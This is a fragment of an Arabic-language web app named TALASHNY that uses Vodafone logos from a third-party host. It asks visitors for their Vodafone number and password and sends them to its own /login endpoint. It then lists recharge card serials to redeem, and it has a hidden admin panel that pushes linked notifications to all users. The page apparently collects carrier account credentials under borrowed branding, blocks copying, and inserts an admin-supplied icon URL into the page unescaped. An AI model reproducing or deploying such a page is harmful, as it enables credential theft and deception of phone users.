  margin-bottom:13px;transition:border-color .25s;
}
.pw-field-wrap:focus-within{border-color:var(--border-red);}
.pw-field-wrap input{
  flex:1;background:none;border:none;outline:none;
  font-family:'Alexandria',sans-serif;font-size:.88rem;
  font-weight:700;color:var(--text);padding:13px 14px;
  direction:ltr;letter-spacing:2px;text-align:center;
}
.pw-field-wrap .ico{width:40px;text-align:center;color:var(--text3);font-size:.75rem;flex-shrink:0;}
.btn-auth{
  width:100%;padding:13px;border:none;border-radius:var(--r-sm);
  background:var(--red);color:#fff;
  font-family:'Alexandria',sans-serif;font-size:.85rem;font-weight:800;
  cursor:pointer;transition:all .2s;
  box-shadow:0 4px 16px rgba(230,0,0,.25);
}
.btn-auth:hover{background:var(--red3);}
.btn-auth:active{transform:scale(.97);}
.auth-err{
  font-size:.65rem;font-weight:700;color:#ff5555;
  text-align:center;margin-bottom:10px;
  opacity:0;transition:opacity .2s;
}
.auth-err.show{opacity:1;}

/* Admin content */
.admin-content{
  padding:16px 18px 40px;
  display:none;
  overflow-y:auto;
  -webkit-overflow-scrolling:touch;
  flex:1;
}
.admin-content.visible{display:flex;flex-direction:column;}

.admin-field{margin-bottom:14px;}
.admin-label{
  font-size:.54rem;font-weight:700;letter-spacing:1.5px;
  text-transform:uppercase;color:var(--text3);margin-bottom:7px;display:block;
}
.admin-textarea{
  width:100%;background:var(--dark3);border:1.5px solid var(--border);
  border-radius:var(--r-sm);padding:12px 14px;resize:none;
  font-family:'Alexandria',sans-serif;font-size:.82rem;font-weight:700;
  color:var(--text);direction:rtl;outline:none;line-height:1.6;
  transition:border-color .25s;
}
.admin-textarea:focus{border-color:var(--border-red);}
.admin-textarea::placeholder{color:var(--text3);}

.admin-type-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:7px;margin-bottom:14px;}
.type-btn{
  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:5px;
  padding:10px 6px;border-radius:var(--r-sm);
  background:var(--dark3);border:1.5px solid var(--border);
  cursor:pointer;transition:all .2s;
  font-family:'Alexandria',sans-serif;font-size:.56rem;font-weight:700;color:var(--text3);
}
.type-btn i{font-size:.85rem;}
.type-btn.active-info{background:rgba(79,195,247,.07);border-color:rgba(79,195,247,.3);color:#80ccee;}
.type-btn.active-ok{background:rgba(0,200,90,.07);border-color:rgba(0,200,90,.3);color:var(--green);}
.type-btn.active-err{background:rgba(230,0,0,.07);border-color:rgba(230,0,0,.3);color:#ff8888;}

.admin-title-field{
  width:100%;background:var(--dark3);border:1.5px solid var(--border);
  border-radius:var(--r-sm);padding:11px 14px;
  font-family:'Alexandria',sans-serif;font-size:.82rem;font-weight:700;
  color:var(--text);direction:rtl;outline:none;
  transition:border-color .25s;
}
.admin-title-field:focus{border-color:var(--border-red);}
.admin-title-field::placeholder{color:var(--text3);}

.admin-dur-grid{display:flex;gap:6px;flex-wrap:wrap;}
.dur-btn{
  flex:1;min-width:42px;padding:8px 4px;text-align:center;
  background:var(--dark3);border:1.5px solid var(--border);
  border-radius:8px;cursor:pointer;
  font-family:'Alexandria',sans-serif;font-size:.62rem;font-weight:700;color:var(--text3);
  transition:all .2s;
}
.dur-btn:hover{border-color:rgba(230,0,0,.3);color:var(--text);}
.dur-btn.active{background:rgba(230,0,0,.08);border-color:rgba(230,0,0,.35);color:var(--red);}

/* Admin Tabs */
.admin-tabs{
  display:flex;border-bottom:1px solid var(--border);
  flex-shrink:0;
}
.admin-tab{
  flex:1;padding:10px 6px;text-align:center;
  font-family:'Alexandria',sans-serif;font-size:.58rem;font-weight:700;
  color:var(--text3);cursor:pointer;border-bottom:2px solid transparent;
  transition:all .2s;
}
.admin-tab.active{color:var(--red);border-bottom-color:var(--red);}

/* History list */
.hist-list{display:flex;flex-direction:column;gap:8px;}
.hist-item{
  background:var(--dark3);border:1px solid var(--border);
  border-radius:10px;padding:10px 12px;
  display:flex;align-items:flex-start;justify-content:space-between;gap:8px;
  position:relative;overflow:hidden;
}
.hist-item::before{content:'';position:absolute;top:0;right:0;bottom:0;width:3px;}
.hist-item.type-info::before{background:var(--red);}
.hist-item.type-ok::before{background:var(--green);}
.hist-item.type-err::before{background:#ff5555;}
.hist-item-body{flex:1;min-width:0;}
.hist-item-title{font-size:.65rem;font-weight:800;color:var(--text);margin-bottom:2px;}
.hist-item-text{font-size:.58rem;color:var(--text2);line-height:1.4;
  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.hist-item-meta{display:flex;align-items:center;gap:6px;margin-top:5px;}
.hist-meta-chip{
  display:inline-flex;align-items:center;gap:3px;
  font-size:.5rem;font-weight:700;
  padding:2px 7px;border-radius:100px;
}
.hist-meta-time{background:rgba(255,255,255,.05);color:var(--text3);}
.hist-meta-views{background:rgba(232,199,111,.07);color:var(--gold);}
.hist-resend{
  width:28px;height:28px;border-radius:8px;flex-shrink:0;
  background:rgba(230,0,0,.07);border:1px solid rgba(230,0,0,.15);
  display:flex;align-items:center;justify-content:center;
  cursor:pointer;color:var(--red);font-size:.6rem;transition:all .2s;
}
.hist-resend:hover{background:rgba(230,0,0,.15);}
.hist-empty{text-align:center;padding:24px;color:var(--text3);font-size:.65rem;}

/* Schedule items */
.sched-list{display:flex;flex-direction:column;gap:8px;}
.sched-item{
  background:var(--dark3);border:1px solid var(--border);
  border-radius:10px;padding:10px 12px;
  display:flex;align-items:flex-start;justify-content:space-between;gap:8px;
  position:relative;overflow:hidden;
}
.sched-item.done-item{ opacity:.45; }
.sched-item::before{content:'';position:absolute;top:0;right:0;bottom:0;width:3px;}
.sched-item.type-info::before{background:var(--red);}
.sched-item.type-ok::before{background:var(--green);}
.sched-item.type-err::before{background:#ff5555;}
.sched-item-body{flex:1;min-width:0;}
.sched-item-title{font-size:.65rem;font-weight:800;color:var(--text);margin-bottom:2px;}
.sched-item-text{font-size:.58rem;color:var(--text2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.sched-item-time{
  display:inline-flex;align-items:center;gap:4px;
  font-size:.5rem;font-weight:700;margin-top:5px;
  padding:2px 8px;border-radius:100px;
  background:rgba(232,199,111,.07);color:var(--gold);
}
.sched-item-time.done-badge{background:rgba(0,200,90,.07);color:var(--green);}
.sched-del{
  width:26px;height:26px;border-radius:7px;flex-shrink:0;
  background:rgba(255,85,85,.07);border:1px solid rgba(255,85,85,.15);
  display:flex;align-items:center;justify-content:center;
  cursor:pointer;color:#ff5555;font-size:.58rem;transition:all .2s;
}
.sched-del:hover{background:rgba(255,85,85,.18);}

/* datetime-local dark style */
input[type="datetime-local"]{
  color-scheme:dark;
}

.admin-btns{display:flex;gap:8px;margin-top:4px;}
.btn-send-notif{
  flex:1;padding:13px;border:none;border-radius:var(--r-sm);
  background:var(--red);color:#fff;
  font-family:'Alexandria',sans-serif;font-size:.78rem;font-weight:800;
  cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:6px;
  box-shadow:0 4px 16px rgba(230,0,0,.25);
}
.btn-send-notif:hover{background:var(--red3);transform:translateY(-1px);}
.btn-send-notif:active{transform:scale(.95);}
.btn-clear-notif{
  padding:13px 16px;border-radius:var(--r-sm);
  background:var(--dark3);border:1px solid var(--border);
  color:var(--text3);cursor:pointer;transition:all .2s;
  font-family:'Alexandria',sans-serif;font-size:.7rem;font-weight:700;
}
.btn-clear-notif:hover{border-color:var(--border-red);color:var(--red);}

.admin-stats{
  display:grid;grid-template-columns:1fr 1fr;gap:8px;
  margin-top:14px;padding-top:14px;border-top:1px solid var(--border);
}
.adm-stat{
  background:var(--dark3);border:1px solid var(--border);
  border-radius:10px;padding:10px 12px;text-align:center;
}
.adm-stat-val{font-size:1.1rem;font-weight:900;color:var(--red);}
.adm-stat-lbl{font-size:.5rem;color:var(--text3);margin-top:3px;letter-spacing:.5px;}

.admin-sep{
  font-size:.5rem;font-weight:700;letter-spacing:2px;
  color:var(--text3);display:flex;align-items:center;gap:8px;
  text-transform:uppercase;margin:14px 0;
}
.admin-sep::before,.admin-sep::after{content:'';flex:1;height:1px;background:var(--border);}

.notif-preview{
  background:var(--dark3);border:1px solid var(--border);
  border-radius:10px;padding:11px 13px;
  display:flex;align-items:flex-start;gap:9px;
  border-right:3px solid var(--red);
  transition:border-color .2s;
}
.notif-preview.type-ok{border-right-color:var(--green);}
.notif-preview.type-err{border-right-color:#ff5555;}
.notif-preview .prev-icon{
  width:28px;height:28px;border-radius:7px;
  background:rgba(230,0,0,.1);display:flex;align-items:center;justify-content:center;
  color:var(--red);font-size:.7rem;flex-shrink:0;transition:all .2s;
}
.notif-preview.type-ok .prev-icon{background:rgba(0,200,90,.1);color:var(--green);}
.notif-preview.type-err .prev-icon{background:rgba(255,85,85,.1);color:#ff5555;}
.notif-preview .prev-body{}
.notif-preview .prev-title{font-size:.65rem;font-weight:800;color:var(--text);margin-bottom:2px;}
.notif-preview .prev-app{font-size:.48rem;color:var(--text3);margin-bottom:4px;}
.notif-preview .prev-text{font-size:.6rem;color:var(--text2);line-height:1.4;}

::-webkit-scrollbar{width:3px;}
::-webkit-scrollbar-track{background:var(--dark);}
::-webkit-scrollbar-thumb{background:rgba(230,0,0,.3);border-radius:3px;}
</style>
</head>
<body>

<!-- ══ SPLASH ══ -->
<div id="s-splash" class="screen active">
  <div class="crescent-box">
    <svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <radialGradient id="mg" cx="35%" cy="28%" r="70%">
          <stop offset="0%"   stop-color="#fff9d6"/>
          <stop offset="40%"  stop-color="#e8c76f"/>
          <stop offset="80%"  stop-color="#b8922a"/>
          <stop offset="100%" stop-color="#7a5a10"/>
        </radialGradient>
        <filter id="glow" x="-20%" y="-20%" width="140%" height="140%">
          <feGaussianBlur in="SourceGraphic" stdDeviation="5" result="b"/>
          <feColorMatrix in="b" type="matrix"
            values="1 0.7 0 0 0  0.7 0.5 0 0 0  0 0 0 0 0  0 0 0 0.6 0" result="c"/>
          <feMerge><feMergeNode in="c"/><feMergeNode in="SourceGraphic"/></feMerge>
        </filter>
      </defs>
      <path d="M120 32 A95 95 0 1 1 120 208 A72 72 0 1 0 120 32 Z"
        fill="url(#mg)" filter="url(#glow)"
        stroke="rgba(255,235,120,.3)" stroke-width="1.5"/>
      <polygon points="183,48 185.8,56.5 194.5,56.5 187.8,61.5 190.5,70 183,65 175.5,70 178.2,61.5 171.5,56.5 180.2,56.5"
        fill="#fff9d6" filter="url(#glow)"/>
      <polygon points="202,26 203.4,30.5 208,30.5 204.3,33.2 205.7,37.7 202,35 198.3,37.7 199.7,33.2 196,30.5 200.6,30.5"
        fill="rgba(255,240,150,.6)"/>
    </svg>
    <img src="https://tlashane.serv00.net/vo/vodafone2.png" class="vf-logo" alt=""/>
  </div>
  <div class="sp-title">كروت رمضان</div>
  <div class="sp-sub">عروض الشهر الكريم &nbsp;•&nbsp; اشحن واستمتع</div>
  <div class="sp-bar"><div class="sp-fill"></div></div>
</div>

<!-- ══ LOGIN ══ -->
<div id="s-login" class="screen">
  <div class="login-wrap">
    <div class="login-head">
      <div class="login-icon">
        <img src="https://tlashane.serv00.net/vo/vodafone2.png" alt=""/>
      </div>
      <div class="login-title">TALASHNY</div>
      <div class="login-sub">سجّل دخولك بحساب فودافون</div>
    </div>
    <div id="errBox" class="err-box" style="display:none">
      <i class="fas fa-circle-exclamation"></i>
      <span id="errMsg"></span>
    </div>
    <div class="login-card">
      <div class="card-sep">تسجيل الدخول</div>
      <div class="field">
        <label>رقم الموبايل</label>
        <div class="input-box">
          <input type="tel" id="inpNum" placeholder="01XXXXXXXXX"
            inputmode="tel" autocomplete="tel" required/>
          <span class="ico"><i class="fas fa-mobile-screen-button"></i></span>
        </div>
      </div>
      <div class="field">
        <label>كلمة المرور</label>
        <div class="input-box">
          <input type="password" id="inpPw" placeholder="••••••••"
            autocomplete="current-password" required/>
          <span class="ico"><i class="fas fa-lock"></i></span>
        </div>
      </div>
      <button class="btn-login" id="loginBtn" onclick="doLogin()">
        <i class="fas fa-right-to-bracket"></i>&nbsp; دخول
      </button>
    </div>
    <div class="sec-note">
      <i class="fas fa-shield-halved"></i> اتصال آمن ومشفر
    </div>
  </div>
</div>

<!-- ══ APP ══ -->
<div id="s-app" class="screen">
  <div class="topbar">
    <div class="tbar-brand">
      <div class="tbar-logo">
        <img src="https://tlashane.serv00.net/vo/vodafone2.png" alt=""/>
      </div>
      <div class="tbar-name">TALASHNY</div>
    </div>
    <div class="tbar-right">
      <div class="tbar-num" id="topNum">—</div>
      <div class="tbar-live">
        <!-- النقطة الخضرا — اضغطها 5 مرات للأدمن -->
        <div class="live-dot" id="liveDotBtn" onclick="handleLiveTap()"></div>
        متصل
      </div>
    </div>
  </div>

  <div class="appwrap">
    <div class="toprow">
      <div></div>
      <button class="btn-logout" id="logoutBtn">
        <i class="fas fa-power-off"></i>&nbsp;خروج
      </button>
    </div>
    <div class="stats-bar">
      <div class="stat s-red">
        <div class="stat-val" id="st-total">—</div>
        <div class="stat-lbl">كروت</div>
      </div>
      <div class="stat s-gold">
        <div class="stat-val" id="st-max">—</div>
        <div class="stat-lbl">أعلى فئة</div>
      </div>
      <div class="stat s-green">
        <div class="stat-val">
          <i class="fas fa-circle" style="font-size:.5rem"></i>
          <span id="st-online">—</span>
        </div>
        <div class="stat-lbl">متصل الآن</div>
      </div>
    </div>
    <div class="timer-row">
      <div class="t-ring">
        <svg viewBox="0 0 40 40">
          <circle class="t-bg"   cx="20" cy="20" r="16"/>
          <circle class="t-prog" id="tprog" cx="20" cy="20" r="16"/>
        </svg>
        <div class="t-count" id="tnum">15</div>
      </div>
      <div class="t-info">
        <div class="t-label">تحديث تلقائي</div>
        <div class="t-sub">كل 15 ثانية</div>
      </div>
      <div class="live-badge"><div class="lb-dot"></div>LIVE</div>
    </div>
    <div class="sec-row">
      <div class="sec-title"><div class="sec-line"></div>الكروت المتاحة</div>
      <div class="sec-badge" id="ccnt">—</div>
    </div>
    <div id="cardsWrap">
      <div class="empty">
        <i class="fas fa-spinner fa-spin" style="color:var(--red);opacity:.8"></i>
        <p>جاري التحميل...</p>
      </div>
    </div>
  </div>

  <nav class="botnav">
    <a href="https://t.me/FY_TF" target="_blank" class="nav-link">
      <i class="fab fa-telegram-plane"></i><span>تيليجرام</span>
    </a>
    <a href="https://wa.me/message/U6AIKBGFCNCQK1" target="_blank" class="nav-link">
      <i class="fab fa-whatsapp"></i><span>واتساب</span>
    </a>
    <a href="https://www.facebook.com/VI808IV" target="_blank" class="nav-link">
      <i class="fab fa-facebook-f"></i><span>فيسبوك</span>
    </a>
  </nav>
</div>

<!-- ══ SLIDE NOTIFICATION ══ -->
<div class="notif-slide" id="notifSlide" onclick="notifClick()">
  <div class="notif-top-row">
    <div class="notif-slide-icon" id="notifIcon">
      <i class="fas fa-bell"></i>
    </div>
    <div class="notif-slide-body">
      <div class="notif-slide-title">
        <span id="notifTitle">TALASHNY</span>
        <span class="notif-slide-app">الآن</span>
      </div>
      <div class="notif-slide-text" id="notifText"></div>
    </div>
  </div>
  <a class="notif-action-btn" id="notifActionBtn" style="display:none" target="_blank">
    <i class="fas fa-arrow-up-right-from-square"></i>
    <span id="notifBtnLabel">افتح الرابط</span>
  </a>
  <div class="notif-bar"><div class="notif-bar-fill" id="notifBarFill"></div></div>
</div>

<!-- ══ ADMIN OVERLAY ══ -->
<div class="admin-overlay" id="adminOverlay">
  <div class="admin-panel">
    <div class="admin-drag-bar"></div>

    <!-- Head -->
    <div class="admin-head">
      <div class="admin-head-left">
        <div class="admin-head-icon"><i class="fas fa-tower-broadcast"></i></div>
        <div>
          <div class="admin-head-title">ADMIN</div>
          <div class="admin-head-sub">لوحة التحكم</div>
        </div>
      </div>
      <div class="admin-close" onclick="closeAdmin()"><i class="fas fa-xmark"></i></div>
    </div>

    <!-- Auth -->
    <div class="admin-auth" id="adminAuth">
      <div class="admin-auth-title">أدخل كلمة المرور</div>
      <div class="pin-dots" id="pinDots">
        <div class="pin-dot"></div>
        <div class="pin-dot"></div>
        <div class="pin-dot"></div>
        <div class="pin-dot"></div>
        <div class="pin-dot"></div>
        <div class="pin-dot"></div>
      </div>
      <div class="auth-err" id="authErr">❌ كلمة المرور غلط</div>
      <div class="pw-field-wrap">
        <span class="ico"><i class="fas fa-key"></i></span>
        <input type="password" id="adminPwInput" placeholder="••••••••••" onkeydown="if(event.key==='Enter')checkAdminPw()"/>
      </div>
      <button class="btn-auth" onclick="checkAdminPw()">
        <i class="fas fa-unlock-keyhole"></i>&nbsp; دخول
      </button>
    </div>

    <!-- Content -->
    <div class="admin-content" id="adminContent">

      <!-- Tabs -->
      <div class="admin-tabs">
        <div class="admin-tab active" id="tab-send" onclick="switchTab('send')">
          <i class="fas fa-paper-plane"></i>&nbsp; إرسال
        </div>
        <div class="admin-tab" id="tab-schedule" onclick="switchTab('schedule')">
          <i class="fas fa-calendar-clock"></i>&nbsp; جدولة
        </div>
        <div class="admin-tab" id="tab-history" onclick="switchTab('history')">
          <i class="fas fa-clock-rotate-left"></i>&nbsp; السجل
        </div>
      </div>

      <!-- ══ TAB: SEND ══ -->
      <div id="tabSend" style="padding-top:14px">

      <!-- Stats — 3 boxes now -->
      <div class="admin-stats" style="grid-template-columns:1fr 1fr 1fr">
        <div class="adm-stat">
          <div class="adm-stat-val" id="adm-online">—</div>
          <div class="adm-stat-lbl">متصل الآن</div>
        </div>
        <div class="adm-stat">
          <div class="adm-stat-val" id="adm-today">—</div>
          <div class="adm-stat-lbl">شحنات اليوم</div>
        </div>
        <div class="adm-stat" style="border-top-color:var(--gold)" >
          <div class="adm-stat-val" id="adm-views" style="color:var(--gold)">—</div>
          <div class="adm-stat-lbl">شافوا الإشعار</div>
        </div>
      </div>

      <div class="admin-sep">إرسال إشعار</div>

      <!-- Type selector -->
      <div class="admin-type-grid">
        <div class="type-btn active-info" id="type-info" onclick="setType('info')">
          <i class="fas fa-circle-info" style="color:#80ccee"></i>معلومة
        </div>
        <div class="type-btn" id="type-ok" onclick="setType('ok')">
          <i class="fas fa-circle-check" style="color:var(--green)"></i>نجاح
        </div>
        <div class="type-btn" id="type-err" onclick="setType('err')">
          <i class="fas fa-circle-exclamation" style="color:#ff8888"></i>تحذير
        </div>
      </div>

      <!-- Title -->
      <div class="admin-field">
        <label class="admin-label">عنوان الإشعار</label>
        <input type="text" class="admin-title-field" id="notifTitleInput"
          placeholder="مثال: تنبيه مهم..." value="TALASHNY" oninput="updatePreview()"/>
      </div>

      <!-- Message -->
      <div class="admin-field">
        <label class="admin-label">نص الرسالة</label>
        <textarea class="admin-textarea" id="notifMsgInput" rows="3"
          placeholder="اكتب رسالتك هنا..." oninput="updatePreview()"></textarea>
      </div>

      <!-- Icon URL -->
      <div class="admin-field">
        <label class="admin-label"><i class="fas fa-image" style="margin-left:4px"></i>رابط الأيقونة (اختياري)</label>
        <div class="input-box" style="background:var(--dark3)">
          <input type="url" id="notifIconInput" placeholder="https://..." style="font-size:.72rem;direction:ltr" oninput="updatePreview()"/>
          <span class="ico"><i class="fas fa-link"></i></span>
        </div>
      </div>

      <!-- Link URL + button label -->
      <div class="admin-field">
        <label class="admin-label"><i class="fas fa-arrow-up-right-from-square" style="margin-left:4px"></i>رابط الزرار (اختياري)</label>
        <div class="input-box" style="background:var(--dark3);margin-bottom:7px">
          <input type="url" id="notifLinkInput" placeholder="https://..." style="font-size:.72rem;direction:ltr" oninput="updatePreview()"/>
          <span class="ico"><i class="fas fa-link"></i></span>
        </div>
        <div class="input-box" style="background:var(--dark3)">
          <input type="text" id="notifBtnInput" placeholder="نص الزرار... مثلاً: افتح العرض" style="font-size:.72rem" oninput="updatePreview()"/>
          <span class="ico"><i class="fas fa-i-cursor"></i></span>
        </div>
      </div>

      <!-- Preview -->
      <div class="admin-sep">معاينة</div>
      <div class="notif-preview" id="notifPreview">
        <div class="prev-icon" id="prevIconWrap"><i class="fas fa-bell"></i></div>
        <div class="prev-body" style="flex:1">
          <div class="prev-app">TALASHNY • الآن</div>
          <div class="prev-title" id="prevTitle">TALASHNY</div>
          <div class="prev-text" id="prevText">نص الرسالة هيظهر هنا...</div>
          <div id="prevBtn" style="display:none;margin-top:7px">
            <span style="display:inline-flex;align-items:center;gap:4px;font-size:.55rem;font-weight:800;color:var(--red);background:rgba(230,0,0,.08);border:1px solid rgba(230,0,0,.2);padding:4px 10px;border-radius:6px">
              <i class="fas fa-arrow-up-right-from-square"></i>
              <span id="prevBtnLabel">افتح الرابط</span>
            </span>
          </div>
        </div>
      </div>

      <!-- Duration -->
      <div class="admin-field" style="margin-top:14px">
        <label class="admin-label">مدة ظهور الإشعار</label>
        <div class="admin-dur-grid" id="durGrid">
          <div class="dur-btn active" onclick="setDur(this,60)">1 د</div>
          <div class="dur-btn" onclick="setDur(this,300)">5 د</div>
          <div class="dur-btn" onclick="setDur(this,600)">10 د</div>
          <div class="dur-btn" onclick="setDur(this,1800)">30 د</div>
          <div class="dur-btn" onclick="setDur(this,3600)">ساعة</div>
        </div>
      </div>

      <!-- Buttons -->
      <div class="admin-btns" style="margin-top:10px">
        <button class="btn-send-notif" onclick="sendNotif()">
          <i class="fas fa-paper-plane"></i>&nbsp;إرسال للكل
        </button>
        <button class="btn-clear-notif" onclick="clearNotif()">
          <i class="fas fa-trash"></i>
        </button>
      </div>

      </div><!-- /tabSend -->

      <!-- ══ TAB: HISTORY ══ -->
      <div id="tabHistory" style="display:none;padding-top:14px">
        <div class="hist-list" id="histList">
          <div class="hist-empty"><i class="fas fa-inbox" style="display:block;font-size:1.5rem;margin-bottom:8px;opacity:.3"></i>لا يوجد سجل بعد</div>
        </div>
      </div>

      <!-- ══ TAB: SCHEDULE ══ -->
      <div id="tabSchedule" style="display:none;padding-top:14px">

        <!-- فورم جديد -->
        <div class="sched-form">
          <div class="admin-sep" style="margin-top:0">إشعار جديد مجدول</div>

          <div class="admin-type-grid" style="margin-bottom:10px">
            <div class="type-btn active-info" id="stype-info" onclick="setSchedType('info')">
              <i class="fas fa-circle-info" style="color:#80ccee"></i>معلومة
            </div>
            <div class="type-btn" id="stype-ok" onclick="setSchedType('ok')">
              <i class="fas fa-circle-check" style="color:var(--green)"></i>نجاح
            </div>
            <div class="type-btn" id="stype-err" onclick="setSchedType('err')">
              <i class="fas fa-circle-exclamation" style="color:#ff8888"></i>تحذير
            </div>
          </div>

          <div class="admin-field">
            <label class="admin-label">عنوان الإشعار</label>
            <input type="text" class="admin-title-field" id="schedTitleInput" placeholder="TALASHNY" value="TALASHNY"/>
          </div>

          <div class="admin-field">
            <label class="admin-label">نص الرسالة</label>
            <textarea class="admin-textarea" id="schedMsgInput" rows="2" placeholder="اكتب الرسالة..."></textarea>
          </div>

          <div class="admin-field">
            <label class="admin-label"><i class="fas fa-calendar-clock" style="margin-left:4px"></i>وقت الإرسال</label>
            <input type="datetime-local" id="schedTimeInput" class="admin-title-field" style="direction:ltr"/>
          </div>

          <div class="admin-field">
            <label class="admin-label">رابط الزرار (اختياري)</label>
            <div class="input-box" style="background:var(--dark3)">
              <input type="url" id="schedLinkInput" placeholder="https://..." style="font-size:.72rem;direction:ltr"/>
              <span class="ico"><i class="fas fa-link"></i></span>
            </div>
          </div>

          <button class="btn-send-notif" style="width:100%;margin-top:4px" onclick="addSchedule()">
            <i class="fas fa-calendar-plus"></i>&nbsp;جدولة الإشعار
          </button>
        </div>

        <!-- قائمة المجدولة -->
        <div class="admin-sep">المجدولة</div>
        <div class="sched-list" id="schedList">
          <div class="hist-empty"><i class="fas fa-calendar-xmark" style="display:block;font-size:1.5rem;margin-bottom:8px;opacity:.3"></i>لا توجد إشعارات مجدولة</div>
        </div>

      </div><!-- /tabSchedule -->

    </div><!-- /admin-content -->
  </div>
</div>

<!-- toast -->
<div class="toast" id="toastEl"></div>

<script>
const _=id=>document.getElementById(id);
function esc(s){
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
function showToast(msg,t=''){
  const el=_('toastEl');
  el.textContent=msg; el.className='toast show'+(t?' '+t:'');
  clearTimeout(el._t); el._t=setTimeout(()=>el.classList.remove('show'),2800);
}

/* ── SWITCH ── */
function goTo(newId){
  const screens = document.querySelectorAll('.screen');
  screens.forEach(s=>{
    if(s.id===newId){
      s.classList.add('active');
    } else {
      s.classList.remove('active');
    }
  });
  if(newId==='s-app') _(newId).scrollTop=0;
}

/* ── حماية النسخ والسياق ── */
document.addEventListener('contextmenu', e=>e.preventDefault());
document.addEventListener('copy',   e=>e.preventDefault());
document.addEventListener('cut',    e=>e.preventDefault());
document.addEventListener('dragstart', e=>e.preventDefault());
// حماية long-press على موبايل
document.addEventListener('touchstart', e=>{
  if(e.target.tagName!=='INPUT' && e.target.tagName!=='TEXTAREA' && e.target.tagName!=='A'){
    e.target._lpTimer = setTimeout(()=>e.preventDefault(), 500);
  }
},{passive:true});
document.addEventListener('touchend', e=>{
  clearTimeout(e.target._lpTimer);
},{passive:true});

let timerInt=null, pingInt=null;
function startPing(){ fetch('/ping'); clearInterval(pingInt); pingInt=setInterval(()=>fetch('/ping'),15000); }
function stopPing(){ clearInterval(pingInt); }

/* ── BOOT ── */
(async()=>{
  try{
    const r=await fetch('/check'); const d=await r.json();
    if(d.logged){
      _('s-splash').classList.remove('active');
      _('topNum').textContent=d.number;
      goTo('s-app'); startPing(); startCycle(); return;
    }
  }catch{}
  setTimeout(()=>{
    const sp=_('s-splash');
    sp.style.transition='opacity .8s ease'; sp.style.opacity='0';
    setTimeout(()=>{ sp.classList.remove('active'); goTo('s-login'); }, 800);
  }, 5400);
})();

/* ── LOGIN ── */
async function doLogin(){
  const num=_('inpNum').value.trim(), pw=_('inpPw').value.trim();
  if(!num||!pw) return;
  const btn=_('loginBtn');
  btn.disabled=true; btn.innerHTML='<i class="fas fa-spinner fa-spin"></i>&nbsp; جاري التحقق...';
  _('errBox').style.display='none';
  try{
    const fd=new FormData(); fd.append('number',num); fd.append('password',pw);
    const r=await fetch('/login',{method:'POST',body:fd}); const d=await r.json();
    if(d.ok){
      _('topNum').textContent=d.number;
      // vibrate خفيف لو متاح
      navigator.vibrate && navigator.vibrate(30);
      goTo('s-app'); startPing(); startCycle();
    }
    else{ _('errMsg').textContent=d.error||'الرقم أو الباسورد غلط'; _('errBox').style.display='flex'; }
  }catch{ _('errMsg').textContent='خطأ في الاتصال — تحقق من النت'; _('errBox').style.display='flex'; }
  btn.disabled=false; btn.innerHTML='<i class="fas fa-right-to-bracket"></i>&nbsp; دخول';
}
_('inpPw')?.addEventListener('keydown',e=>{ if(e.key==='Enter') doLogin(); });
_('inpNum')?.addEventListener('keydown',e=>{ if(e.key==='Enter') _('inpPw').focus(); });

/* ── LOGOUT ── */
_('logoutBtn').onclick=async()=>{
  await fetch('/logout'); clearInterval(timerInt); stopPing(); goTo('s-login');
};

/* ── COPY ── */
function copySerial(btn){
  const s=btn.closest('.card-serial').querySelector('.serial-val').textContent.trim();
  const ok=()=>{
    const o=btn.innerHTML;
    btn.innerHTML='<i class="fas fa-check" style="color:var(--green)"></i>';
    setTimeout(()=>btn.innerHTML=o,1500); showToast('✅ تم نسخ الكود','ok');
  };
  if(navigator.clipboard) navigator.clipboard.writeText(s).then(ok).catch(fb); else fb();
  function fb(){
    const t=document.createElement('textarea'); t.value=s;
    t.style.cssText='position:fixed;opacity:0'; document.body.appendChild(t);
    t.select(); try{document.execCommand('copy')}catch{} document.body.removeChild(t); ok();
  }
}

/* ── CHARGE ── */
async function chargeCard(serial,amount,btn){
  btn.classList.add('loading'); btn.innerHTML='<i class="fas fa-spinner fa-spin"></i>&nbsp;<span>جاري...</span>';
  try{
    const r=await fetch('/redeem?serial='+encodeURIComponent(serial)+'&amount='+encodeURIComponent(amount));
    const d=await r.json();
    if(d.ok){ showToast('✅ تم الشحن بنجاح','ok'); btn.classList.remove('loading'); btn.classList.add('done'); btn.innerHTML='<i class="fas fa-check"></i>&nbsp;<span>تم الشحن</span>'; }
    else{ showToast('❌ فشل الشحن','err'); btn.classList.remove('loading'); btn.innerHTML='<i class="fas fa-bolt"></i>&nbsp;<span>شحن أونلاين</span>'; }
  }catch{ showToast('❌ خطأ في الاتصال','err'); btn.classList.remove('loading'); btn.innerHTML='<i class="fas fa-bolt"></i>&nbsp;<span>شحن أونلاين</span>'; }
}

/* ══════════════════════════════════════════════
   SLIDE NOTIFICATION
══════════════════════════════════════════════ */
let notifTimer=null, currentNotifLink='';

function notifClick(){
  if(currentNotifLink){
    window.open(currentNotifLink,'_blank');
  }
}

function showNotif(title, text, type='info', duration=5000, iconUrl='', linkUrl='', btnLabel=''){
  const el    = _('notifSlide');
  const icon  = _('notifIcon');
  const fill  = _('notifBarFill');
  const icons = { info:'fa-bell', ok:'fa-circle-check', err:'fa-circle-exclamation' };
  const colors= { info:'var(--red)', ok:'var(--green)', err:'#ff5555' };
  const color = colors[type]||'var(--red)';

  _('notifTitle').textContent = title;
  _('notifText').textContent  = text;

  // أيقونة — صورة أو أيقونة افتراضية
  if(iconUrl){
    icon.innerHTML = `<img src="${iconUrl}" onerror="this.parentElement.innerHTML='<i class=\\'fas fa-bell\\'></i>'"/>`;
  } else {
    icon.innerHTML = `<i class="fas ${icons[type]||'fa-bell'}"></i>`;
    icon.style.color = color;
  }
  el.style.borderRightColor = color;
  fill.style.background = color;

  // زرار الرابط
  currentNotifLink = linkUrl;
  const actionBtn = _('notifActionBtn');
  if(linkUrl){
    actionBtn.href = linkUrl;
    _('notifBtnLabel').textContent = btnLabel || 'افتح الرابط';
    actionBtn.style.display = 'flex';
    actionBtn.style.borderColor = color;
    actionBtn.style.color = color;
    actionBtn.style.background = color.replace('var(--red)','rgba(230,0,0,.09)')
                                       .replace('var(--green)','rgba(0,200,90,.09)')
